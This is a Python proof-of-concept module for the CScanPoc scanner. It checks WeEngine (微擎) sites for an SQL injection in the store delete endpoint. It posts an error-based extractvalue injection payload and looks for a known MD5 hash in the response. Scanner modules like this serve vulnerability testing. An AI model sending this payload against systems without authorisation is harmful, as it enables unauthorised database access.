# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'we7_0002_L' # 平台漏洞编号，留空
    name = '微擎普通用户权限SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-07-13'  # 漏洞公布时间
    desc = '''
        漏洞文件：/web/source/mc/store.ctrl.php
        直接是获取相关参数，直接带入表中进行删除动作。既然delete中没有进行任何的非删除之外的动作。就可以直接注入了。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3963/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '微擎'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5598a05b-6f74-426f-827c-e28bbed72ad9'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #登录用户
            s = requests.session()
            #获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            ''' 
            s.get(self.target + '/web/index.php', cookies=cookies)
            payload = "/web/index.php?c=mc&a=store&do=delete"
            data = "id[]=a\&id[]=) and extractvalue(1, concat(0x5c, (select md5(c))))--"
            url = self.target + payload
            r = s.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
